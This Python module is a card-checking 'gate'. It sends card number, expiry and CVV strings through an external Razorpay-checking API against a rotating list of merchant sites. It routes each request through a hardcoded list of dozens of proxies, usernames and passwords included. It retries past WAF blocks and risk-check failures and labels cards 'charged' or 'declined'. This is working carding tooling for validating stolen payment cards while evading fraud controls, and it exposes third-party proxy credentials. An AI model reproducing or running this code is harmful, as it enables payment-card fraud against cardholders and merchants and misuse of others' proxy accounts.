import asyncio
import aiohttp
import random
import logging
import os
import time

DEFAULT_API_BASE = "https://fast-razorpay-production.up.railway.app"
RZ_API_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rz_api.txt")

RZ_SITES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rz_sites.txt")

RZ_CLEAN_PROXIES = [
    "175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "ca-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "mx-mex.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "no-osl.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-kis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-sto.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "kr-seo.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-van.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "sk-bra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "202.28.17.8:8080:s6301074610292:za0643250344",
    "202.28.17.8:8080:s6402011520288:surikan123",
    "md-chi.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-ber.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "be-bru.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "fr-par.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "tw-tai.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ch-zur.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "hk-hon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "175.29.133.8:5433:799JRELTBPAE:F7BQ7D3EQSQA",
    "37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "my-kua.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "is-rey.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "mt-qor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cy-lim.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "br-sao.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "za-joh.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "id-jak.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-got.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "jp-tok.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "103.204.108.142:12345:naveed:Qwerty_123ABC",
    "de-fra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "at-wie.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ae-dub.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "th-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "co-bog.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "bg-sof.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ph-man.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "nz-auc.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "rs-bel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lu-lux.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-per.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-mel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-bri.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cz-pra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "hu-bud.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "nl-ams.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-syd.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "dk-cop.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "202.41.171.9:2086:3700900107896:ratchaburi79",
    "gr-ath.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cl-san.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pt-lis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "proxy.ttu.edu.tw:3128:g10701005:j0i2m2",
    # Squid Proxies - Group 1316 (8)
    "p101.squidproxies.com:9014:1316:p8zishJyoWbr",
    "p101.squidproxies.com:9016:1316:p8zishJyoWbr",
    "p101.squidproxies.com:9017:1316:p8zishJyoWbr",
    "p102.squidproxies.com:9015:1316:p8zishJyoWbr",
    "p102.squidproxies.com:9016:1316:p8zishJyoWbr",
    "p103.squidproxies.com:9014:1316:p8zishJyoWbr",
    "p103.squidproxies.com:9015:1316:p8zishJyoWbr",
    "p103.squidproxies.com:9016:1316:p8zishJyoWbr",
    # Squid Proxies - Group 1331 (7)
    "p101.squidproxies.com:9051:1331:GxdGBwgR$6pZ",
    "p101.squidproxies.com:9053:1331:GxdGBwgR$6pZ",
    "p102.squidproxies.com:9051:1331:GxdGBwgR$6pZ",
    "p102.squidproxies.com:9053:1331:GxdGBwgR$6pZ",
    "p103.squidproxies.com:9050:1331:GxdGBwgR$6pZ",
    "p103.squidproxies.com:9052:1331:GxdGBwgR$6pZ",
    "p103.squidproxies.com:9053:1331:GxdGBwgR$6pZ",
    # Aura Solutions - US Mobile (1)
    "core-us.aura-solutions.io:8603:pool-mobile-target-mobile-country-us:orsw80ebfgdflsgq",
    # New pvdata.host (2)
    "ie-dub.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "sg-sin.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    # PureVPN pointtoserver (7)
    "px051703.pointtoserver.com:10780:purevpn0s11340994:ak3t35fp",
    "px023005.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px043006.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px410701.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px041202.pointtoserver.com:10780:reseller3270s320237:7Grp9Gki",
    "px150902.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    "px1260303.pointtoserver.com:10780:purevpn0s551451:9dpdlc2nfxgj",
    # Residential ISP proxies (11)
    "191.96.202.210:6256:kfwfjvwy:fhkh6io981ee",
    "46.203.212.64:5512:kfwfjvwy:fhkh6io981ee",
    "168.199.244.104:6636:kfwfjvwy:fhkh6io981ee",
    "31.58.29.114:6080:kfwfjvwy:fhkh6io981ee",
    "86.38.236.94:6378:kfwfjvwy:fhkh6io981ee",
    "38.154.182.243:7511:kfwfjvwy:fhkh6io981ee",
    "64.64.118.2:6585:kfwfjvwy:fhkh6io981ee",
    "151.245.206.106:8101:kfwfjvwy:fhkh6io981ee",
    "64.188.120.57:7804:kfwfjvwy:fhkh6io981ee",
    "45.43.93.79:7328:kfwfjvwy:fhkh6io981ee",
    "5.249.177.8:5433:9T1GYK9U3S2B:SAWF8Y0JHSB0",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API FAILOVER SYSTEM (Auto-Failover & Round-Robin)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RZ_API_ENDPOINTS = []
RZ_API_HEALTH = {}
RZ_CURRENT_API_INDEX = 0
RZ_API_FAIL_COOLDOWN = 120

def load_rz_api_endpoints():
    global RZ_API_ENDPOINTS, RZ_API_HEALTH
    try:
        if os.path.exists(RZ_API_FILE):
            with open(RZ_API_FILE, "r", encoding="utf-8") as f:
                loaded = [line.strip() for line in f if line.strip()]
                if loaded:
                    RZ_API_ENDPOINTS = loaded
                    RZ_API_HEALTH.clear()
                    for endpoint in RZ_API_ENDPOINTS:
                        RZ_API_HEALTH[endpoint] = {"healthy": True, "last_fail": 0, "fail_count": 0, "success_count": 0}
                    logging.info(f"[RZ-API] Loaded {len(RZ_API_ENDPOINTS)} endpoints from file")
    except Exception as e:
        logging.error(f"[RZ-API] Error loading endpoints: {e}")

load_rz_api_endpoints()

def get_next_healthy_rz_api():
    global RZ_CURRENT_API_INDEX
    current_time = time.time()
    healthy_endpoints = []

    for endpoint, health in RZ_API_HEALTH.items():
        if health["healthy"]:
            healthy_endpoints.append(endpoint)
        elif current_time - health["last_fail"] > RZ_API_FAIL_COOLDOWN:
            health["healthy"] = True
            health["fail_count"] = 0
            healthy_endpoints.append(endpoint)
            logging.info(f"[RZ-API] Recovered endpoint: {endpoint}")

    if not healthy_endpoints:
        logging.warning("[RZ-API] All endpoints unhealthy, resetting health status")
        for endpoint in RZ_API_ENDPOINTS:
            RZ_API_HEALTH[endpoint]["healthy"] = True
            RZ_API_HEALTH[endpoint]["fail_count"] = 0
        healthy_endpoints = RZ_API_ENDPOINTS.copy()

    start_idx = RZ_CURRENT_API_INDEX % len(healthy_endpoints)
    RZ_CURRENT_API_INDEX = (RZ_CURRENT_API_INDEX + 1) % len(healthy_endpoints)
    return healthy_endpoints[start_idx]

def mark_rz_api_failure(endpoint: str):
    if endpoint in RZ_API_HEALTH:
        RZ_API_HEALTH[endpoint]["healthy"] = False
        RZ_API_HEALTH[endpoint]["last_fail"] = time.time()
        RZ_API_HEALTH[endpoint]["fail_count"] += 1
        logging.warning(f"[RZ-API] Marked as FAILED: {endpoint}")

def mark_rz_api_success(endpoint: str):
    if endpoint in RZ_API_HEALTH:
        RZ_API_HEALTH[endpoint]["success_count"] += 1
        if not RZ_API_HEALTH[endpoint]["healthy"]:
            RZ_API_HEALTH[endpoint]["healthy"] = True
            RZ_API_HEALTH[endpoint]["fail_count"] = 0
            logging.info(f"[RZ-API] Recovered endpoint: {endpoint}")

def get_rz_api_stats() -> dict:
    stats = {}
    for endpoint, health in RZ_API_HEALTH.items():
        short_name = endpoint.replace("https://", "").replace("/razorpay", "")
        stats[short_name] = {
            "healthy": health["healthy"],
            "fail_count": health["fail_count"],
            "success_count": health["success_count"],
            "last_fail": health["last_fail"]
        }
    return stats

def add_rz_api_endpoint(new_endpoint: str) -> bool:
    global RZ_API_ENDPOINTS
    new_endpoint = new_endpoint.rstrip('/')
    if new_endpoint in RZ_API_ENDPOINTS:
        return False
    RZ_API_ENDPOINTS.append(new_endpoint)
    RZ_API_HEALTH[new_endpoint] = {"healthy": True, "last_fail": 0, "fail_count": 0, "success_count": 0}
    try:
        with open(RZ_API_FILE, "w", encoding="utf-8") as f:
            for endpoint in RZ_API_ENDPOINTS:
                f.write(f"{endpoint}\n")
    except Exception as e:
        logging.error(f"[RZ-API] Error saving endpoints: {e}")
    return True

def remove_rz_api_endpoint(index: int) -> str:
    global RZ_API_ENDPOINTS
    if 0 <= index < len(RZ_API_ENDPOINTS):
        removed = RZ_API_ENDPOINTS.pop(index)
        if removed in RZ_API_HEALTH:
            del RZ_API_HEALTH[removed]
        try:
            with open(RZ_API_FILE, "w", encoding="utf-8") as f:
                for endpoint in RZ_API_ENDPOINTS:
                    f.write(f"{endpoint}\n")
        except Exception as e:
            logging.error(f"[RZ-API] Error saving endpoints: {e}")
        return removed
    return None

def _get_user_proxy(user_id=None):
    if RZ_CLEAN_PROXIES:
        return random.choice(RZ_CLEAN_PROXIES)
    return None

def _get_random_site():
    try:
        if os.path.exists(RZ_SITES_FILE):
            with open(RZ_SITES_FILE, "r", encoding="utf-8") as f:
                sites = [line.strip() for line in f if line.strip()]
            if sites:
                return random.choice(sites)
    except Exception:
        pass
    return None

def _get_all_sites():
    try:
        if os.path.exists(RZ_SITES_FILE):
            with open(RZ_SITES_FILE, "r", encoding="utf-8") as f:
                sites = [line.strip() for line in f if line.strip()]
            if sites:
                return sites
    except Exception:
        pass
    return []

def _normalize_year(yy):
    yy = yy.strip()
    if len(yy) == 2:
        return "20" + yy
    return yy

def _format_card(card):
    try:
        parts = card.strip().split("|")
        if len(parts) != 4:
            return None
        num, mm, yy, cvv = parts
        return f"{num}|{mm}|{_normalize_year(yy)}|{cvv}"
    except Exception:
        return None

async def _do_api_call(formatted_card, user_id=None, skip_proxy=False, site=None):
    api_base = get_next_healthy_rz_api()
    params = {"cc": formatted_card}
    if not skip_proxy:
        proxy = _get_user_proxy(user_id)
        if proxy:
            params["proxy"] = proxy
    if not site:
        site = _get_random_site()
    if site:
        params["site"] = site

    timeout = aiohttp.ClientTimeout(total=60)
    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"{api_base}/razorpay/", params=params) as resp:
                if resp.status == 429:
                    mark_rz_api_failure(api_base)
                    return {"status": "error", "response": "API rate limited (429)"}
                if resp.status in [400, 500, 502, 503, 504]:
                    mark_rz_api_failure(api_base)
                    text = await resp.text()
                    return {"status": "error", "response": f"API HTTP {resp.status}: {text[:100]}"}
                if resp.status == 200:
                    data = await resp.json()
                    mark_rz_api_success(api_base)
                    return data
                text = await resp.text()
                return {"status": "error", "response": f"API HTTP {resp.status}: {text[:100]}"}
    except asyncio.TimeoutError:
        mark_rz_api_failure(api_base)
        return {"status": "error", "response": "API request timed out"}
    except Exception as e:
        mark_rz_api_failure(api_base)
        return {"status": "error", "response": f"API request failed: {str(e)[:60]}"}

async def check_gate(card: str, user_id: int = None) -> dict:
    try:
        formatted = _format_card(card)
        if not formatted:
            return {"status": "error", "response": "Invalid card format"}

        all_sites = _get_all_sites()
        max_attempts = 8
        for attempt in range(max_attempts):
            try:
                site = all_sites[attempt % len(all_sites)] if all_sites else None
                data = await _do_api_call(formatted, user_id, skip_proxy=False, site=site)
            except asyncio.TimeoutError:
                data = {"status": "error", "response": "API request timed out"}
            except Exception as e:
                data = {"status": "error", "response": f"API request failed: {str(e)[:60]}"}

            gate_status = data.get("status", "error").lower()
            api_response = data.get("response", "No response")
            proxy_status = data.get("proxy_status", "Unknown")

            if "payment successful" in api_response.lower():
                gate_status = "charged"
                api_response = "Pᴀʏᴍᴇɴᴛ Sᴜᴄᴄᴇꜱꜱꜰᴜʟ"

            if "payment_risk_check_failed" in api_response.lower():
                gate_status = "declined"
                api_response = "Pᴀʏᴍᴇɴᴛ Dᴇᴄʟɪɴᴇᴅ (Pᴀʏᴍᴇɴᴛ_Rɪꜱᴋ_Cʜᴇᴄᴋ_Fᴀɪʟᴇᴅ)"

            if "waf blocked" in api_response.lower():
                gate_status = "error"

            if "expectation failed" in api_response.lower():
                gate_status = "error"

            if "input_validation_failed" in api_response.lower():
                gate_status = "error"

            if gate_status == "error":
                if attempt < max_attempts - 1:
                    await asyncio.sleep(0.3)
                    continue

            return {"status": gate_status, "response": api_response, "proxy_status": proxy_status}

    except Exception as e:
        logging.error(f"[Razorpay API] Unhandled error: {e}")
        return {"status": "error", "response": f"Gate error: {str(e)[:60]}"}
